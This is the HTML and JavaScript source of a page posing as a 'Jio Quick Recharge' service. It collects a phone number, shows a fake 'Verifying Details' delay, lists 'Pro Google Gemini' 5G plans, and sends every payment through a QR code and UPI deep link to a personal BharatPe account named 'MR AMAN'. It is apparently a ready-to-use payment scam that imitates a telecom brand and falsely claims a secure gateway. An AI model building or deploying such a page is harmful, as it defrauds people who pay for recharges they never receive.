<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jio Quick Recharge</title>
    <style>
        :root { --jio-blue: #0a2885; --bg: #f5f7fa; }
        body { font-family: sans-serif; background: var(--bg); margin: 0; }
        .hidden { display: none; }
        
        /* 3-Second Loader Design */
        .loader-overlay { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: white; }
        .spin { width: 45px; height: 45px; border: 5px solid #f3f3f3; border-top: 5px solid var(--jio-blue); border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }

        /* Premium UI Elements */
        .card { background: white; margin: 20px auto; width: 90%; max-width: 400px; padding: 25px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
        .btn-blue { background: var(--jio-blue); color: white; border: none; width: 100%; padding: 15px; border-radius: 25px; font-weight: bold; font-size: 18px; cursor: pointer; }
        .plan-item { background: white; margin: 12px; padding: 15px; border-radius: 12px; border: 1px solid #ddd; text-align: left; position: relative; }
        .badge { background: #fff3e0; color: #e65100; font-size: 11px; padding: 3px 8px; border-radius: 5px; font-weight: bold; margin-bottom: 8px; display: inline-block; }
    </style>
</head>
<body>

    <div id="step1">
        <div class="card">
            <h2 style="color:var(--jio-blue)">Quick Recharge</h2>
            <input type="tel" id="mobileNum" placeholder="Enter Mobile Number" maxlength="10" style="width:100%; padding:12px; margin:15px 0; border:1px solid #ccc; border-radius:8px; box-sizing:border-box;">
            <select style="width:100%; padding:12px; margin-bottom:15px; border:1px solid #ccc; border-radius:8px;">
                <option>Jio (True 5G)</option>
                <option>Airtel (5G Plus)</option>
            </select>
            <button class="btn-blue" onclick="move('step1', 'step2')">Get Plans →</button>
        </div>
    </div>

    <div id="loadingScreen" class="hidden">
        <div class="loader-overlay">
            <div class="spin"></div>
            <p style="margin-top:15px; color:#555; font-weight:bold;">Verifying Details...</p>
        </div>
    </div>

    <div id="step2" class="hidden">
        <div style="background:var(--jio-blue); color:white; padding:15px; font-weight:bold;">Popular Plans</div>
        <div id="plans-container"></div>
    </div>

    <div id="step3" class="hidden">
        <div class="card">
            <h1 id="payPrice" style="margin:0; font-size:40px;">₹0</h1>
            <div class="badge">Pro Google Gemini Plan</div>
            <p style="color:#666; font-size:14px;">Merchant: <b>MR AMAN</b></p>
            
            <img src="qr.jpg" alt="BharatPe QR" style="width:220px; border:1px solid #eee; margin:10px 0;">
            
            <button class="btn-blue" id="finalPayBtn">Pay with UPI App</button>
            <p style="font-size:11px; color:#999; margin-top:10px;">Safe & Secure BharatPe Gateway</p>
        </div>
    </div>

    <script>
        // MR AMAN's BharatPe UPI Details
        const amanUPI = "BHARATPE.8Y0Y1E0M3W31937@fbpe";
        const merchant = "MR AMAN";
        let selectedAmt = 0;

        function move(oldStep, nextStep) {
            document.getElementById(oldStep).classList.add('hidden');
            document.getElementById('loadingScreen').classList.remove('hidden');
            
            setTimeout(() => {
                document.getElementById('loadingScreen').classList.add('hidden');
                document.getElementById(nextStep).classList.remove('hidden');
                if(nextStep === 'step2') loadPlans();
            }, 3000); // 3 Second loading
        }

        function loadPlans() {
            const plans = [
                {amt: 349, val: "28 Days", data: "2 GB/Day"},
                {amt: 500, val: "28 Days", data: "2 GB/Day"},
                {amt: 899, val: "90 Days", data: "2 GB/Day + 20GB"},
                {amt: 3599, val: "365 Days", data: "2.5 GB/Day"}
            ];
            let listHtml = "";
            plans.forEach(p => {
                listHtml += `
                <div class="plan-item">
                    <div class="badge">PRO GOOGLE GEMINI</div>
                    <div style="display:flex; justify-content:space-between; align-items:center;">
                        <span style="font-size:24px; font-weight:bold;">₹${p.amt}</span>
                        <span style="color:red; font-size:11px; font-weight:bold;">TRUE 5G</span>
                    </div>
                    <div style="margin:10px 0; font-size:13px; color:#666;">
                        Validity: <b>${p.val}</b> | Data: <b>${p.data}</b>
                    </div>
                    <button class="btn-blue" style="padding:8px; font-size:14px;" onclick="initPay(${p.amt})">Buy Now</button>
                </div>`;
            });
            document.getElementById('plans-container').innerHTML = listHtml;
        }

        function initPay(amt) {
            selectedAmt = amt;
            document.getElementById('payPrice').innerText = "₹" + amt;
            
            // Mobile UPI App deep link
            document.getElementById('finalPayBtn').onclick = function() {
                window.location.href = `upi://pay?pa=${amanUPI}&pn=${encodeURIComponent(merchant)}&am=${amt}&cu=INR`;
            };
            
            move('step2', 'step3');
        }
    </script>
</body>
</html>
